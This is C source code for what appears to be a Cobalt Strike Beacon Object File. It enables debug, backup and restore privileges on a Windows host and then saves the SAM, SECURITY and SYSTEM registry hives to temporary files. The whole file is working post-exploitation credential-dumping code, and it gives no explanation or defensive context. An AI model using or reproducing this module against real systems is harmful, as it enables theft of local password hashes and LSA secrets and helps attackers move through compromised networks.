#include "common.h"

WINBASEAPI WINBOOL WINAPI KERNEL32$DeleteFileA (LPCTSTR lpFileName);
DECLSPEC_IMPORT LONG WINAPI KERNEL32$GetTempPathA(DWORD,LPSTR);
DECLSPEC_IMPORT UINT WINAPI KERNEL32$GetTempFileNameA(LPCSTR,LPCSTR,UINT,LPSTR);

void EnableDebugPriv( LPCSTR priv ) 
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tp;


	if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		BeaconPrintf(CALLBACK_ERROR, "[*] OpenProcessToken failed, Error = %d .\n" , KERNEL32$GetLastError() );
		return;
	}

	if (ADVAPI32$LookupPrivilegeValueA( NULL, priv, &luid ) == 0 )
	{
		BeaconPrintf(CALLBACK_ERROR, "[*] LookupPrivilegeValue() failed, Error = %d .\n", KERNEL32$GetLastError() );
		KERNEL32$CloseHandle( hToken );
		return;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	
	if (!ADVAPI32$AdjustTokenPrivileges( hToken, FALSE, &tp, sizeof(tp), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL ))
	{
		BeaconPrintf(CALLBACK_ERROR, "[*] AdjustTokenPrivileges() failed, Error = %u\n", KERNEL32$GetLastError() );
		return;
	}

	KERNEL32$CloseHandle( hToken );
}

BOOL ExportRegKey(LPCSTR subkey, LPCSTR outFile)
{
	BOOL result = FALSE;
	HKEY hSubKey;
	LPSECURITY_ATTRIBUTES lpSecurityAttributes = NULL;
    if(ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE,subkey,REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_ALL_ACCESS,&hSubKey)==ERROR_SUCCESS)
    {
        if (ADVAPI32$RegSaveKeyA(hSubKey, outFile, lpSecurityAttributes)==ERROR_SUCCESS)
		{
			result = TRUE;
		}
		else
		{
			BeaconPrintf(CALLBACK_ERROR,"[*] RegSaveKey failed (%s).", subkey);
		}
		
        ADVAPI32$RegCloseKey(hSubKey);
    }
	else
	{
		BeaconPrintf(CALLBACK_ERROR,"[*] Could not open key %s",subkey);
	}
   return result;
}

void go(char * args, int alen)
{
    	formatp mwrout;
    	BeaconFormatAlloc(&mwrout,1024);

	char tmpPath[MAX_PATH] = "";
	char tmpFileSAM[MAX_PATH] = "";
	char tmpFileSECURITY[MAX_PATH] = "";
	char tmpFileSYSTEM[MAX_PATH] = "";

	if (!BeaconIsAdmin()){
	  BeaconPrintf(CALLBACK_ERROR, "Admin privileges required to use this module!");
	  return;
	}
	
	// Get temporary file names
	KERNEL32$GetTempPathA(MAX_PATH, (char *) &tmpPath);
	KERNEL32$GetTempFileNameA((char *) &tmpPath, "tmp", 0, (char *) &tmpFileSAM);
	KERNEL32$GetTempFileNameA((char *) &tmpPath, "tmp", 0, (char *) &tmpFileSECURITY);
	KERNEL32$GetTempFileNameA((char *) &tmpPath, "tmp", 0, (char *) &tmpFileSYSTEM);

	//Enabling required privileges for reg operations
	EnableDebugPriv(SE_DEBUG_NAME);
	EnableDebugPriv(SE_RESTORE_NAME);
	EnableDebugPriv(SE_BACKUP_NAME);

	// RegSave needs the files to not exist
	KERNEL32$DeleteFileA((char *) &tmpFileSAM);
	KERNEL32$DeleteFileA((char *) &tmpFileSECURITY);
	KERNEL32$DeleteFileA((char *) &tmpFileSYSTEM);

	if (ExportRegKey("SYSTEM", (char *) &tmpFileSYSTEM))
       	  BeaconFormatPrintf(&mwrout,"regsave: SYSTEM hive saved to %s\n", &tmpFileSYSTEM);
	
	if (ExportRegKey("SAM", (char *) &tmpFileSAM))
          BeaconFormatPrintf(&mwrout,"regsave: SAM hive saved to %s\n", &tmpFileSAM);

	if (ExportRegKey("SECURITY", (char *) &tmpFileSECURITY))
          BeaconFormatPrintf(&mwrout,"regsave: SECURITY hive saved to %s\n", &tmpFileSECURITY);

        int outSize = 0;
        char* dataOut = BeaconFormatToString(&mwrout, &outSize);
        BeaconOutput(CALLBACK_OUTPUT, dataOut, outSize);

	BeaconFormatFree(&mwrout);
};
